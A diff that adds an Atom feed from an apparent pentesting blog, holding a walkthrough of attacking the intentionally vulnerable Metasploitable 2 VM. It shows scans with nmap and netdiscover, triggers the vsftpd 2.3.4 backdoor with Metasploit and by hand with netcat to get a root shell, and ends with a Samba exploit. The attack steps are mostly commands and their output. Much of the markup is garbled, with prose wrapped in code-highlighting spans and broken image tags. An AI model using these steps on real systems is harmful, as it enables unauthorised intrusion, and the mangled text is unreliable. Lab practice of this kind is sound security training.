@@ -1,0 +1,558 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Kali Linux | CBE-Pentester]]></title>
+  <link href="http://tecraksa.github.io/blog/categories/kali-linux/atom.xml" rel="self"/>
+  <link href="http://tecraksa.github.io/"/>
+  <updated>2015-03-15T21:06:59+05:30</updated>
+  <id>http://tecraksa.github.io/</id>
+  <author>
+    <name><![CDATA[D.S.Sellva Manoj]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Metasploitable-2]]></title>
+    <link href="http://tecraksa.github.io/blog/2015/03/15/metasploitable-2/"/>
+    <updated>2015-03-15T21:01:25+05:30</updated>
+    <id>http://tecraksa.github.io/blog/2015/03/15/metasploitable-2</id>
+    <content type="html"><![CDATA[<p><p>Metasploitable 2 is virtual machine based on Linux, which contains several vulnerabilities to  exploit using <code>Metasploit</code> framework as well other security tools.</p>
+
+<ul>
+<li><strong>Author: [<a href="https://community.rapid7.com">Rapid7</a>].</strong></li>
+<li><strong>Series: [Metasploitable].</strong></li>
+<li><strong>Release Date: [12 Jun 2012].</strong></li>
+<li><strong>Download Link: [<a href="http://download.vulnhub.com/metasploitable/metasploitable-linux-2.0.0.zip.torrent">vulnhub</a>].</strong></li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Used <strong><em>Netdiscover</em></strong> to identify the target IP of the remote machine.</li>
+<li>Used <strong><em>Nmap</em></strong> to Banner grabbed the services running on the open ports.</li>
+<li>Used <strong><em>Metasploit</em></strong> to exploit open ports and running services.</li>
+<li>Used <strong><em>Netcat</em></strong> for making a reverse shell.</li>
+</ul>
+
+
+<h2>Tools Used</h2>
+
+<ul>
+<li>Metasploitable_2 [8825F2509A9B9A58EC66BD65EF83167F]</li>
+<li>Netdiscover [Can be found in Kali Linux]</li>
+<li>Nmap [Can be found in Kali Linux]</li>
+<li>Metasploit [Can be found in Kali Linux]</li>
+<li>Netcat [Can be found in Kali Linux]</li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p><p>As a initial stage we downloaded the vm and imported to VMware Workstation. After successful import, we started to do a discovery
+of target ip by running the <code>Netdiscover</code> command.
+<code>ruby Netdiscover Output
+root@Hacker:~# netdiscover -r 192.168.2.0/24
+192.168.2.7     00:0c:29:fa:dd:2a    01    060   VMware, Inc.
+</code>                                                      <br/>
+<p> After the discovery of target ip, we ran <code>Nmap</code> to identify the open ports of the target ip. Which gave us
+a huge list of port no along with their state (open|closed|filterd), service, and Version.
+<figure class='code'><figcaption><span>Nmap Output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">root</span><span class="vi">@Hacker</span><span class="ss">:~</span><span class="c1"># nmap -sS -sV -p 1-10000 192.168.2.7&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="no">Starting</span> <span class="no">Nmap</span> <span class="mi">6</span><span class="o">.</span><span class="mi">46</span> <span class="p">(</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;http://nmap.org&quot;</span><span class="o">&gt;</span><span class="ss">http</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span><span class="o">&lt;</span><span class="sr">/a&gt; ) at 2014-08-24 09:32 IST</span>
+</span><span class='line'><span class="sr">Nmap scan report for 192.168.2.7</span>
+</span><span class='line'><span class="sr">Host is up (0.00011s latency).</span>
+</span><span class='line'><span class="sr">Not shown: 9974 closed ports</span>
+</span><span class='line'><span class="sr">PORT     STATE SERVICE     VERSION</span>
+</span><span class='line'><span class="sr">21/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ftp</span>         <span class="n">vsftpd</span> <span class="mi">2</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="mi">4</span>
+</span><span class='line'><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>         <span class="no">OpenSSH</span> <span class="mi">4</span><span class="o">.</span><span class="mi">7</span><span class="n">p1</span> <span class="no">Debian</span> <span class="mi">8</span><span class="n">ubuntu1</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'><span class="mi">23</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">telnet</span>      <span class="no">Linux</span> <span class="n">telnetd</span>
+</span><span class='line'><span class="mi">25</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">smtp</span>        <span class="no">Postfix</span> <span class="n">smtpd</span>
+</span><span class='line'><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">domain</span>      <span class="no">ISC</span> <span class="no">BIND</span> <span class="mi">9</span><span class="o">.</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span>
+</span><span class='line'><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>        <span class="no">Apache</span> <span class="n">httpd</span> <span class="mi">2</span><span class="o">.</span><span class="mi">2</span><span class="o">.</span><span class="mi">8</span> <span class="p">((</span><span class="no">Ubuntu</span><span class="p">)</span> <span class="no">DAV</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
+</span><span class='line'><span class="mi">111</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">rpcbind</span>     <span class="mi">2</span> <span class="p">(</span><span class="no">RPC</span> <span class="c1">#100000)</span>
+</span><span class='line'><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span> <span class="no">Samba</span> <span class="n">smbd</span> <span class="mi">3</span><span class="o">.</span><span class="n">X</span> <span class="p">(</span><span class="ss">workgroup</span><span class="p">:</span> <span class="no">WORKGROUP</span><span class="p">)</span>
+</span><span class='line'><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span> <span class="no">Samba</span> <span class="n">smbd</span> <span class="mi">3</span><span class="o">.</span><span class="n">X</span> <span class="p">(</span><span class="ss">workgroup</span><span class="p">:</span> <span class="no">WORKGROUP</span><span class="p">)</span>
+</span><span class='line'><span class="mi">512</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="nb">exec</span>        <span class="n">netkit</span><span class="o">-</span><span class="n">rsh</span> <span class="n">rexecd</span>
+</span><span class='line'><span class="mi">513</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">login?</span>
+</span><span class='line'><span class="mi">514</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">tcpwrapped</span>
+</span><span class='line'><span class="mi">1099</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">rmiregistry</span> <span class="no">GNU</span> <span class="no">Classpath</span> <span class="n">grmiregistry</span>
+</span><span class='line'><span class="mi">1524</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">shell</span>       <span class="no">Metasploitable</span> <span class="n">root</span> <span class="n">shell</span>
+</span><span class='line'><span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">nfs</span>         <span class="mi">2</span><span class="o">-</span><span class="mi">4</span> <span class="p">(</span><span class="no">RPC</span> <span class="c1">#100003)</span>
+</span><span class='line'><span class="mi">2121</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ftp</span>         <span class="no">ProFTPD</span> <span class="mi">1</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="mi">1</span>
+</span><span class='line'><span class="mi">3306</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">mysql</span>       <span class="no">MySQL</span> <span class="mi">5</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">51</span><span class="n">a</span><span class="o">-</span><span class="mi">3</span><span class="n">ubuntu5</span>
+</span><span class='line'><span class="mi">3632</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">distccd</span>     <span class="n">distccd</span> <span class="n">v1</span> <span class="p">((</span><span class="no">GNU</span><span class="p">)</span> <span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="o">.</span><span class="mi">4</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="o">.</span><span class="mi">4</span><span class="o">-</span><span class="mi">1</span><span class="n">ubuntu4</span><span class="p">))</span>
+</span><span class='line'><span class="mi">5432</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">postgresql</span>  <span class="no">PostgreSQL</span> <span class="no">DB</span> <span class="mi">8</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">8</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="mi">7</span>
+</span><span class='line'><span class="mi">5900</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">vnc</span>         <span class="no">VNC</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">3</span><span class="o">.</span><span class="mi">3</span><span class="p">)</span>
+</span><span class='line'><span class="mi">6000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="no">X11</span>         <span class="p">(</span><span class="n">access</span> <span class="n">denied</span><span class="p">)</span>
+</span><span class='line'><span class="mi">6667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">irc</span>         <span class="no">Unreal</span> <span class="n">ircd</span>
+</span><span class='line'><span class="mi">6697</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">irc</span>         <span class="no">Unreal</span> <span class="n">ircd</span>
+</span><span class='line'><span class="mi">8009</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ajp13</span>       <span class="no">Apache</span> <span class="no">Jserv</span> <span class="p">(</span><span class="no">Protocol</span> <span class="n">v1</span><span class="o">.</span><span class="mi">3</span><span class="p">)</span>
+</span><span class='line'><span class="mi">8180</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>        <span class="no">Apache</span> <span class="no">Tomcat</span><span class="o">/</span><span class="no">Coyote</span> <span class="no">JSP</span> <span class="n">engine</span> <span class="mi">1</span><span class="o">.</span><span class="mi">1</span>
+</span><span class='line'><span class="mi">8787</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">drb</span>         <span class="no">Ruby</span> <span class="no">DRb</span> <span class="no">RMI</span> <span class="p">(</span><span class="no">Ruby</span> <span class="mi">1</span><span class="o">.</span><span class="mi">8</span><span class="p">;</span> <span class="n">path</span> <span class="sr">/usr/</span><span class="n">lib</span><span class="o">/</span><span class="n">ruby</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">drb</span><span class="p">)</span>
+</span><span class='line'><span class="no">MAC</span> <span class="ss">Address</span><span class="p">:</span> <span class="mo">00</span><span class="p">:</span><span class="mi">0</span><span class="ss">C</span><span class="p">:</span><span class="mi">29</span><span class="ss">:FA:DD</span><span class="p">:</span><span class="mi">2</span><span class="n">A</span> <span class="p">(</span><span class="no">VMware</span><span class="p">)</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="sb">``</span>
+</span><span class='line'><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="nb">p</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="no">Later</span> <span class="n">on</span><span class="p">,</span> <span class="n">we</span> <span class="n">started</span> <span class="n">to</span> <span class="n">exploit</span> <span class="n">the</span> <span class="n">ports</span> <span class="n">one</span> <span class="n">by</span> <span class="n">one</span> <span class="n">using</span> <span class="o">***&lt;</span><span class="sr">/code&gt;Metasploit`***. Before we started to exploit, we did a</span>
+</span><span class='line'><span class="sr">google search on each version to identify whether we could be able to exploit them.&lt;p /</span><span class="o">&gt;&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h4&gt;Note:&lt;/</span><span class="n">h4</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">A</span> <span class="no">Vulnerability</span> <span class="no">Assessment</span> <span class="n">can</span> <span class="n">be</span> <span class="n">done</span> <span class="n">on</span> <span class="n">the</span> <span class="n">corresponding</span> <span class="n">target</span> <span class="n">ip</span> <span class="n">to</span> <span class="n">identify</span> <span class="n">whether</span> <span class="n">the</span> <span class="n">running</span> <span class="n">serives</span> <span class="n">are</span> <span class="n">vulnerable</span> <span class="n">to</span> <span class="n">exploit</span><span class="o">.</span><span class="n">&lt;</span><span class="nb">p</span> <span class="sr">/&gt;</span>
+</span><span class='line'><span class="sr">&lt;p&gt;Vulnerability Assessment Tools:&lt;p /</span><span class="o">&gt;</span>
+</span><span class='line'><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="no">Nessus</span>
+</span><span class='line'><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="no">OpenVAS</span>
+</span><span class='line'><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="no">ImmunityCanvas</span>
+</span><span class='line'><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="no">Qualys</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h2&gt;FTP Backdoor&lt;/</span><span class="n">h2</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h4</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">.</span><span class="n">Gaining</span> <span class="no">Shell</span> <span class="n">via</span> <span class="no">Metasploit</span><span class="o">&lt;</span><span class="sr">/h4&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;&lt;p&gt;The Virtual machine was found to be running a &lt;strong&gt;&lt;em&gt;&lt;code&gt;FTP&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;</span><span class="sr">/em&gt;&lt;/s</span><span class="n">trong</span><span class="o">&gt;</span> <span class="n">service</span> <span class="n">with</span> <span class="n">version</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">vsftpd</span> <span class="mi">2</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="mi">4</span><span class="o">&lt;</span><span class="sr">/code&gt;&lt;/em</span><span class="o">&gt;&lt;</span><span class="sr">/strong&gt; which was vulnerable to a backdoor</span>
+</span><span class='line'><span class="sr">command execution. We ran the metasploit &lt;strong&gt;&lt;em&gt;&lt;code&gt;msfconsole&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;</span><span class="sr">/em&gt;&lt;/s</span><span class="n">trong</span><span class="o">&gt;</span> <span class="k">in</span> <span class="n">kali</span> <span class="n">linux</span> <span class="ow">and</span> <span class="n">made</span> <span class="n">a</span> <span class="n">search</span> <span class="n">on</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">vsftpd</span><span class="o">&lt;</span><span class="sr">/em&gt;&lt;/s</span><span class="n">trong</span><span class="o">&gt;</span>  <span class="n">which</span> <span class="n">gave</span> <span class="n">us</span> <span class="n">exploit</span> <span class="k">module</span>
+</span><span class='line'><span class="nn">for</span> <span class="n">the</span> <span class="n">backdoor</span> <span class="n">command</span> <span class="n">execution</span> <span class="k">for</span> <span class="n">the</span> <span class="n">specific</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">vsftpd</span> <span class="mi">2</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="mi">4</span><span class="o">&lt;</span><span class="sr">/em&gt;&lt;/s</span><span class="n">trong</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure> ruby Vsftpd 2.3.4
+msf > search vsftpd</p>
+
+<h1>Matching Modules</h1>
+
+<p>   Name                                  Disclosure Date  Rank       Description</p>
+
+<hr />
+
+<p>   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
+<figure class='code'><figcaption><span>Nmap Output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Kick</span> <span class="n">this</span> <span class="k">module</span> <span class="nn">into</span> <span class="n">the</span> <span class="n">msfconsole</span> <span class="n">to</span> <span class="n">make</span> <span class="n">a</span> <span class="n">backdoor</span> <span class="n">to</span> <span class="n">gain</span> <span class="n">a</span> <span class="n">interactive</span> <span class="n">shell</span><span class="o">.</span><span class="n">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;<img class="&lt;a href=&quot;http:/</span><span class=o>/</span><span class=n>i</span><span class=o>.</span><span class=n>imgur</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=no>QBxOc7w</span><span class=o>.</span><span class=n>png</span><span" src="class="s2">&quot;&gt;http://i.imgur.com/QBxOc7w.png&lt;/a&gt;">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;Finally we gained the shell with the help of metasploit vsftpd backdoor module.&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;h4&gt;2.Gaining shell via Netcat&lt;/h4&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;&lt;p&gt; We can also backdoor ftp by running up &lt;code&gt;Netcat&lt;/code&gt; (Reads and writes to TCP and UDP network connections) to gain a shell.&lt;p /&gt;</span>
+</span><span class='line'><span class="s2">&lt;p&gt;Initially run this command in separate terminal to make a connection to &lt;code&gt;FTP&lt;/code&gt; port &lt;code&gt;21&lt;/code&gt; via USER &lt;code&gt;anyname:)&lt;/code&gt; along with the smile &lt;code&gt;:)&lt;/code&gt; and PASS with &lt;code&gt;anypassword&lt;/code&gt;</span>
+</span><span class='line'><span class="s2">&lt;p /&gt;</span>
+</span><span class='line'><span class="s2">&lt;code&gt;ruby Netcat FTP</span>
+</span><span class='line'><span class="s2">root@Hacker:~# nc 192.168.2.7 21 -v</span>
+</span><span class='line'><span class="s2">192.168.2.7: inverse host lookup failed: Unknown server error : Connection timed out</span>
+</span><span class='line'><span class="s2">(UNKNOWN) [192.168.2.7] 21 (ftp) open</span>
+</span><span class='line'><span class="s2">220 (vsFTPd 2.3.4)</span>
+</span><span class='line'><span class="s2">USER sellva:)</span>
+</span><span class='line'><span class="s2">331 Please specify the password.</span>
+</span><span class='line'><span class="s2">PASS pass</span>
+</span><span class='line'><span class="s2">&lt;/code&gt;</span>
+</span><span class='line'><span class="s2">&lt;p&gt;Then open up a new terminal without closing the above running terminal, type in the nc command show below. Where Port &lt;code&gt;6200&lt;/code&gt; is a Backdoor port for the ftp</span>
+</span><span class='line'><span class="s2">and -v mentions Verbose.&lt;p/&gt;&lt;p&gt; You can also do without &lt;code&gt;-v&lt;/code&gt;, it just print out messages on Standard Error, such as when a connection occurs.&lt;p/&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;pre&gt;&lt;code class=&quot;</span><span class="n">ruby</span> <span class="no">Netcat</span> <span class="no">FTP</span><span class="s2">&quot;&gt;root@Hacker:~# nc 192.168.2.7 6200 -v</span>
+</span><span class='line'><span class="s2">192.168.2.7: inverse host lookup failed: Unknown server error : Connection timed out</span>
+</span><span class='line'><span class="s2">(UNKNOWN) [192.168.2.7] 6200 (?) open</span>
+</span><span class='line'><span class="s2">id</span>
+</span><span class='line'><span class="s2">uid=0(root) gid=0(root)</span>
+</span><span class='line'><span class="s2">whoami</span>
+</span><span class='line'><span class="s2">root</span>
+</span><span class='line'><span class="s2">uname -a</span>
+</span><span class='line'><span class="s2">Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span>
+</span><span class='line'><span class="s2">ifconfig</span>
+</span><span class='line'><span class="s2">eth0      Link encap:Ethernet  HWaddr 00:0c:29:fa:dd:2a  </span>
+</span><span class='line'><span class="s2">          inet addr:192.168.2.7  Bcast:192.168.2.255  Mask:255.255.255.0</span>
+</span><span class='line'><span class="s2">          inet6 addr: fe80::20c:29ff:fefa:dd2a/64 Scope:Link</span>
+</span><span class='line'><span class="s2">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span>
+</span><span class='line'><span class="s2">          RX packets:72642 errors:0 dropped:0 overruns:0 frame:0</span>
+</span><span class='line'><span class="s2">          TX packets:20426 errors:0 dropped:0 overruns:0 carrier:0</span>
+</span><span class='line'><span class="s2">          collisions:0 txqueuelen:1000 </span>
+</span><span class='line'><span class="s2">          RX bytes:77577863 (73.9 MB)  TX bytes:1589401 (1.5 MB)</span>
+</span><span class='line'><span class="s2">          Interrupt:19 Base address:0x2000 </span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">lo        Link encap:Local Loopback  </span>
+</span><span class='line'><span class="s2">          inet addr:127.0.0.1  Mask:255.0.0.0</span>
+</span><span class='line'><span class="s2">          inet6 addr: ::1/128 Scope:Host</span>
+</span><span class='line'><span class="s2">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span>
+</span><span class='line'><span class="s2">          RX packets:1670 errors:0 dropped:0 overruns:0 frame:0</span>
+</span><span class='line'><span class="s2">          TX packets:1670 errors:0 dropped:0 overruns:0 carrier:0</span>
+</span><span class='line'><span class="s2">          collisions:0 txqueuelen:0 </span>
+</span><span class='line'><span class="s2">          RX bytes:793069 (774.4 KB)  TX bytes:793069 (774.4 KB)</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">ls</span>
+</span><span class='line'><span class="s2">bin</span>
+</span><span class='line'><span class="s2">boot</span>
+</span><span class='line'><span class="s2">cdrom</span>
+</span><span class='line'><span class="s2">dev</span>
+</span><span class='line'><span class="s2">etc</span>
+</span><span class='line'><span class="s2">home</span>
+</span><span class='line'><span class="s2">&lt;/code&gt;&lt;/pre&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;&lt;p&gt;Voila!!!Finally we also got a shell with the help of Netcat tool.&lt;p/&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;h2&gt;Samba Exploit&lt;/h2&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;&lt;p&gt;The current version of &lt;code&gt;samba server&lt;/code&gt; installed on the remote host is affected by a command execution vulerability,</span>
+</span><span class='line'><span class="s2">where there is no needed of authentication to exploit this vulnerability. We kick started the metasploit, and we chose the below exploit module</span>
+</span><span class='line'><span class="s2">which helped us to gain the Root access of the remote system.&lt;p/&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;<img class="&lt;a href=&quot;</span><span class=ss>http</span><span class=p>:</span><span class=sr>//i</span><span class=o>.</span><span class=n>imgur</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=no>OsaoIOl</span><span class=o>.</span><span class=n>png</span><span" src="class="s2">&quot;&gt;http://i.imgur.com/OsaoIOl.png&lt;/a&gt;">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;&lt;p&gt;Finally!!! We rooted into remote system using the samba exploit.&lt;p /&gt;&lt;/p&gt;</span>
+</span><span class='line'>
